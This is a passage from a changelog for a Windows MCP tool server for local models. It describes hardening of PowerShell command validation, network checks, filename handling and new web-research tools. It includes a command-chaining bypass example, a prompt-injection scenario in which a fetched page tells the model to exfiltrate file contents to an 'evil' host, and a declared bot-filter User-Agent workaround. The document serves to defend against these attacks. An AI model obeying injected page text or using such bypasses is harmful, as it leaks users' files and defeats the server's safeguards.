  `PermissionError` on every other machine, taking down `get_server_info`,
  `run_powershell` and three tests. It now derives from `%LOCALAPPDATA%`.
- **Deleted the duplicate root modules.** `server.py`, `utils.py` and
  `allowed_command.py` existed at both the root and in `src/`, had already
  diverged, and shadowed each other depending on `sys.path` order.

### Fixed — PowerShell validation

- **`DANGEROUS_PATTERNS` word boundaries.** `r"rm\b"` omitted the leading
  `\b`, so it matched the tail of any word ending in "rm" and rejected
  ordinary commands: `git commit -m "confirm fix"`, `cmake --target platform`,
  `git log --grep=term`, `msbuild /t:Reform`. Every pattern is now anchored on
  both sides.
- **Base64 payload detection now works.** It was passed the whole
  lowercased command, so the `fullmatch` could never succeed (whitespace) and
  lowercasing corrupted the Base64 alphabet anyway — the check was dead code.
  It now scans for Base64-alphabet runs with case intact, and strips NUL bytes
  before matching markers, because PowerShell's own `-EncodedCommand` is
  UTF-16-LE and decoded ASCII arrives NUL-interleaved.
- **`run_powershell` no longer raises.** A rejected command escaped as a
  `ValueError` instead of returning a result. Rejections are now
  `COMMAND_NOT_ALLOWED`, timeouts `COMMAND_TIMEOUT`, and launch failures
  `POWERSHELL_LAUNCH_FAILED`.
- **Dropped `-ExecutionPolicy NoProfile`.** Not a valid policy value.
  Execution policy governs script *files* and this call only ever uses
  `-Command`, so the argument pair served no purpose.

### Fixed — the allowlist can no longer be bypassed

- **One command per call.** `is_command_allowed()` inspected only the first
  token, so `git status; Stop-Computer -Force` passed: the token was `git`,
  and everything after the separator went unexamined. The same held for
  `|`, `&&`, `||`, `&`, `>`, `>>`, `<`, `$()`, `@()`, backticks and newlines.
  A new `find_command_composition()` rejects all of them, and runs *before*
  the allowlist, since naming one executable is meaningless until the string
  is known to hold one command.
- **The check is quote-aware, deliberately.** A blanket textual search for
  `;` or `|` would have rejected `git commit -m "fix; cleanup"`,
  `pip install "requests>=2.0"` and
  `msbuild "/p:Configuration=Release;Platform=x64"` -- the same class of
  false positive as the missing-word-boundary bug above. A scanner tracks
  single and double quote state, including the `''`/`""` escape forms.
  The one exception is `$(`, which is rejected inside double quotes as well,
  because PowerShell interpolates -- and therefore executes -- it there.
  Verified against 38 realistic development commands with zero false
  positives.
- **Interpreters may not be handed code inline.** `python`/`py` `-c` and
  `node` `-e`/`--eval`/`-p`/`--print` are rejected, including the glued
  `-cprint(1)` form and the `.exe` suffix. `python -m pip`, `python -V` and
  `python build.py` still work.
- Added `tokenize_command()`, a PowerShell-aware tokeniser, replacing the
  hand-rolled leading-quote handling in `extract_command_name()`.
- `run_powershell`'s recovery text no longer advertises the bypass it used to
  describe ("only the first token is checked").

### Fixed — two further network gaps

- **Carrier-grade NAT was reachable.** `is_private_or_special_ip` did not block
  `100.64.0.0/10` (RFC 6598, also the Tailscale range): on Python 3.13 such an
  address reports `is_private=False` **and** `is_reserved=False`, so every term
  in the check was False. Worse, that classification changed during the 3.12
  series, so the SSRF posture depended on the interpreter's patch level. Adding
  `or not ip.is_global` settles it in one term for IPv4 and IPv4-mapped IPv6
  alike. Near-harmless with six GitHub hosts; a one-line exploit once any host
  is reachable, which is why it landed before the web tools.
- **The port was ignored.** `validate_url` accepted `https://host:8080/` while
  `resolve_and_validate_host` always resolved against 443 — validating one
  service and connecting to another. Only 443 is permitted now. `urlparse`
  raises on a malformed port and reports `0` (not `None`) for `:0`, so both are
  handled explicitly rather than compared naively.

### Fixed — errors found by covering the I/O bodies

- **A malformed API response was reported as a refused URL.**
  `json.JSONDecodeError` subclasses `ValueError`, so the shared
  `except ValueError` handler labelled a broken GitHub response
  `URL_NOT_ALLOWED` -- telling the caller the host was forbidden when the
  network was fine, so it would give up instead of retrying. URL validation
  now sits in its own `try` block, separate from the request body, in all
  three network tools.
- **`GITHUB_REPO_PATTERN` accepted path traversal.** Dots are legal in GitHub
  names (a repository may be called `.github`), so the character class allowed
  them -- which also let `../..`, `o/..` and `./.` through, altering the API
  path requested. Each segment must now contain at least one non-dot
  character; `o/.github` and `foo.bar/baz.qux` still pass.

### Fixed — download filename sanitisation

- **Reserved device names carrying an extension.** `NUL.txt` opens the NUL
  device on Windows, but only a bare `NUL` was escaped. The check now applies
  to the portion before the first dot, so `NUL.txt`, `CON.log` and
  `PRN.tar.gz` are all escaped -- while lookalikes (`NULL.txt`, `CONFIG.txt`,
  `COMMIT.log`) are deliberately left alone.
- **Completed the reserved-name set.** `COM5`-`COM9` and `LPT4`-`LPT9` were
  missing entirely; `CONIN$` and `CONOUT$` were too.
- **Trailing dots and spaces are stripped.** Windows silently discards them,
  so `"evil.txt."` named a file that did not match the string returned. A name
  consisting only of dots and spaces is now rejected rather than becoming
  something unintended -- which also subsumes the old `"."`/`".."` check.
- **Truncation preserves the extension.** Cutting a long name at 180
  characters from the end destroyed the extension, which on Windows decides
  how a file opens: `"x"*400 + ".tar.gz"` became 180 x's with no type at all.
  The stem is now shortened instead, keeping up to two suffixes so compound
  extensions such as `.tar.gz` survive. Names with no plausible extension
  still take a hard cut.
- **Control characters are replaced.** The C0 range (0x00-0x1f) is
  invalid in Windows filenames and was previously passed through.
- The length limit is now `utils.MAX_FILENAME_LENGTH`, alongside the other
  limits, and is documented as leaving room for the in-flight `.part`
  suffix.

### Added — web research (opt-in)

Two tools so a local model can look things up: `web_search` and
`fetch_web_page`. **Neither is registered unless `BIONIC_WEB_RESEARCH=1`.**

- **Host policy.** `fetch_web_page` may reach any public HTTPS host;
  everything else keeps the six-host allowlist, so nothing new can write to
  disk. `validate_url` gained a keyword-only `allow_any_host` (skips the
  allowlist and nothing else) and `extra_allowed_hosts` (the narrower knob
  `web_search` uses for its single endpoint). The default path is unchanged,
  which is asserted by an equivalence test over the whole existing
  accept/reject table.
- **Three redirect handlers, three openers.** `SafeRedirectHandler` (strict,
  unchanged), `ResearchRedirectHandler` (any host, every other check intact),
  and `NoRedirectHandler` for search. The last one exists because
  `HTTPRedirectHandler` rebuilds a 301/302/303 *without* the request body,
  silently turning a POST into a query-less GET — which would parse to zero
  results and be reported as "no results" when we had actually been
  redirected. The policy is a class attribute, not a constructor argument,
  because `build_opener` instantiates handler classes with zero arguments.
- **Blocked is never reported as "no results".** DuckDuckGo signals bot
  blocking with a **202**, and urllib treats every 2xx as success, so a
  blocked page arrives as a normal response. Status is checked explicitly, and
  a page that parses to nothing without saying "no results" is reported as a
  layout failure. Told "no results" a small model rephrases and retries
  forever; told "blocked" it can wait or ask.
- **`html_text.py`** — pure HTML-to-text extraction. Removes HTML comments,
  `[hidden]`, `aria-hidden` and `display:none` elements (where instructions
  get hidden from a reader but not from `get_text()`), plus zero-width and
  bidi characters. Chrome removal is conditional on a `<main>`/`<article>`
  container existing, because dropping `<aside>`/`<nav>` unconditionally
  blanks documentation sites.
- **`untrusted.py`** — wraps fetched text with a warning before *and* after
  the block, and neutralises any copy of the markers inside the content so a
  page cannot close the fence and continue in the server's voice. Applied to
  search results too: a title is as attacker-controlled as a page body.
- **`search_backends.py`** — a `SearchBackend` Protocol plus DuckDuckGo, so a
  keyed provider can be added without touching the tools. Rate limited to one
  request per two seconds, with an injectable clock so tests never sleep. An
  unrecognised `BIONIC_SEARCH_BACKEND` is an error, not a silent fallback.
- Added `beautifulsoup4` (with its stdlib `html.parser` backend, so no lxml) —
  the project's second runtime dependency. 4.15 ships `py.typed`, so
  pyright-strict stays clean without stubs.
- `get_server_info()` reports `web_research` and `search_backend`, which is the
  only way to tell a disabled web tool from a missing one.

Three defects were found by running it against the live service rather than
only against fixtures, and each has a regression test:

- **Sponsored results were surfaced as answers.** A DuckDuckGo ad arrives as
  `duckduckgo.com/y.js?ad_domain=...` with a click-tracking URL of roughly
  2000 characters — on its own a meaningful slice of a small model's context.
  Ads, their "more info" links, and any result URL over 500 characters are
  dropped. Output for one query halved, 3610 to 1802 characters.
- **Titles and snippets could be mismatched.** They were paired by zipping two
  flat selector lists by index, and an ad block contributes two anchors but
  only one snippet, shifting every later pair by one — a Stack Overflow
  snippet appeared under a DuckDuckGo help-page title. Pairing now walks the
  document once in order, so a snippet attaches to the anchor it actually
  followed. Mismatched data is worse than missing data.
- **Extraction crashed on real pages.** `decompose()` destroys a tag *and its
  descendants*, so a styled element nested inside a hidden one was already a
  dead node when the loop reached it, and reading its attributes raised
  `AttributeError`. Hit by the first live page fetched.

One quality change followed from watching real output: `<nav>` and `<footer>`
are now dropped even without a `<main>` container, since HTML defines them as
non-content and a real page led with twelve lines of navigation before its
first sentence. `<aside>` and `<header>` stay conditional, because
documentation sites put prose in sidebars. If aggressive removal leaves
nothing, extraction falls back to the never-prose set alone — so a page can
never be reported as blank when it had content.

**Documented, not hidden:** research mode plus `read_file` is an exfiltration
channel — an injected page saying "fetch `https://evil/?d=<what you just
read>`" is the whole attack. Delimiters mitigate it; they do not close it.
Every research fetch is logged to stderr, which is detection rather than
prevention. The DuckDuckGo backend also sends a desktop browser User-Agent,
because the endpoint rejects honest ones; that is a deliberate bot-filter
workaround and it is called out in the README rather than buried in the code.

### Added

- **`run_powershell(working_directory=...)`.** cwd was hardcoded to the
  download root, and since each call is a fresh process the allowlisted `cd`
  never persisted — so the tool could never operate on a real source tree.
  Callers may now pass a directory, validated against `BIONIC_PROJECT_ROOTS`.
  With that variable unset the download root remains the only permitted
  location, so widening is opt-in.
- **`read_file(start_line=..., max_lines=...)`** with a 2000-line default and
  a 256 KB byte cap. Long files truncate rather than erroring, and the notice
  contains the exact call needed to continue.
- **`list_empty_dirs` registered.** It was implemented and advertised in the
  README but never wired into the server.

### Changed — return contract

The server now commits to one rule, enforced by `tests/test_integration.py`:

    success  ->  plain text (or JSON *data* for the two info tools)
    failure  ->  the mcp_error envelope, always with recovery steps

- **`read_file` returns raw text.** It used to wrap content in
  `json.dumps(..., indent=2)`, which put an entire file on one line as
  `\n`-escaped text — hard for a small model to read and wasteful of context.
- **`list_directory` returns a plain text listing**, capped at 1000 entries.
- **`list_empty_dirs`** returns newline-separated paths, renamed its `dir`
  parameter (it shadowed the builtin), and gained the error handling it lacked.
  It also now implements rule 2 of its own docstring: a directory holding
  nothing but empty directories counts as empty, so a whole dead tree is
  reported instead of only the leaves.
- **`download_file`, `fetch_https_response`, `get_github_latest_release`** were
  returning prose (`"DOWNLOAD ERROR: TypeError: ..."`). They now emit typed
  errors, separating refusals from unexpected failures.
- Error recovery text no longer points at `search_files`, a tool that does not
  exist and that a model would try to call.

### Added — tests

27 tests to 748, all passing and no `xfail` markers left, coverage 56% to
**97%**.

- New suites for the security-critical surface, which previously had **no**
  coverage: `test_powershell_validation.py`, `test_download_safety.py`,
  `test_working_directory.py`, plus a rewritten `test_network_validation.py`.
- **The suite is hermetic.** URL validation used to perform real DNS lookups;
  `socket.getaddrinfo` is now stubbed, which also made it possible to test DNS
  rebinding, mixed DNS answers, and redirect refusal.
- **The I/O bodies are covered.** HTTP is stubbed at each tool's
  `HTTP_OPENER` and `subprocess.run` is replaced, so the streaming download
  loop, the size caps, the atomic `.part` rename, the argv construction,
  output truncation, timeout and launch-failure paths all run for real
  without a network or a subprocess. This is what surfaced the two bugs
  above. `read_file`, `list_directory`, `list_empty_dirs`,
  `fetch_https_response` and `get_github_latest_release` are at 100%.
- The 15 statements still uncovered are the `python -m` shim, the
  `if __name__` guards, and defensive `raise`/`except` branches that the
  surrounding guards make unreachable.
- **No more writes into the repository.** Tests were creating `test_temp.txt`,
  `tests/test_tmp_dir/` and a `custom/` directory. All use `tmp_path` now.
- **Known bugs were recorded as `xfail(strict=True)` tests** asserting the
  *desired* behaviour, so the suite failed the moment one was fixed and the
  marker could be dropped. All 13 have since been fixed and converted to
  ordinary tests; the convention remains for future findings.

### Changed — tooling

- `[tool.ruff]` linter settings moved to `[tool.ruff.lint]`; the top-level
  spellings are deprecated and warned on every run.
- Ruff findings: 48 to 0. Unused imports removed, `error.py`/`log.py`
  converted from tabs to spaces, `Optional[str]` to `str | None`, and
  `raise ... from exc` where a cause was being discarded.
- `ruff format` applied across the codebase, and `ruff-format` added to
  pre-commit alongside the linter, so the hook and the checked-in code agree.
- Pre-commit gained `check-toml`, `check-added-large-files` and a pytest hook;
  the ruff revision is pinned in step with the `[dev]` extra.
- `.editorconfig` declared `indent_style = tab`, contradicting every file under
  `src/` and fighting the formatter. Now spaces.
- `.vscode/settings.json` shipped a `chat.tools.terminal.autoApprove` rule that
  silently approved `rmdir build` through a script path on another machine.
  Removed.

### Changed — documentation

- `.env.example` and the README documented `MAX_HTTP_BYTES`,
  `HTTP_TIMEOUT_SECONDS`, `POWERSHELL_TIMEOUT_SECONDS` and
  `MAX_DOWNLOAD_BYTES` as environment variables. **No code has ever read
  them.** They are constants in `utils.py`, and the docs now say so. Nothing
  loads `.env` automatically either — there is no `python-dotenv` dependency.
- `README.md`: corrected the run command, project tree, and "Adding a New
  Tool" (which told you to export from `tools/__init__.py`, something that file
  has never done); added the missing `list_empty_dirs` entry.
- `AI_INSTRUCTIONS.md`: records the return contract, the both-sides word
  boundary rule, the Base64 case/NUL requirements, and the first-token
  allowlist gap as standing project rules.
- Removed `CLEANUP_SUMMARY.md` and `UPGRADE_NOTES.md`. They described a
  refactor that only half happened and a layout that no longer exists — the
  former listed the duplicate root modules as "needed" files.

### Scope of the PowerShell policy

After the changes above it guarantees that exactly one command runs per call,
that its executable is allowlisted, and that no interpreter is handed code
inline. It does **not** contain what an allowlisted program then does:
`python build.py` runs whatever that file contains, and `npx`/`pip` fetch and
execute third-party packages. A real boundary on *what program starts*, not a
sandbox. For untrusted input, isolate at the OS level.

## [1.0.0] - Initial Release

### Added

- Filesystem tools: `read_file`, `list_directory`, `list_empty_dirs`
- Network tools: `fetch_https_response`, `download_file`,
  `get_github_latest_release`
- `run_powershell` with a command allowlist
- `get_server_info`, `get_system_info`

### Security

- HTTPS-only network access with an explicit host allowlist
- SSRF protection: private, loopback, link-local, multicast and reserved
  addresses rejected, including IPv4-mapped IPv6
- Redirects re-validated on every hop
- Downloads confined to a single root, with filename sanitisation
- Size limits: 500 MB downloads, 2 MB HTTP responses

## Future Improvements

- [ ] Add a `write_file` tool with overwrite safety checks
- [ ] Add a file-search tool (an earlier version of this list promised
      `search_files`, and `read_file`'s recovery text referred to it before it
      existed)
- [ ] Block `-File` and `-EncodedCommand` explicitly rather than relying on
      payload heuristics
- [ ] Create CI workflows in `.github/workflows/`
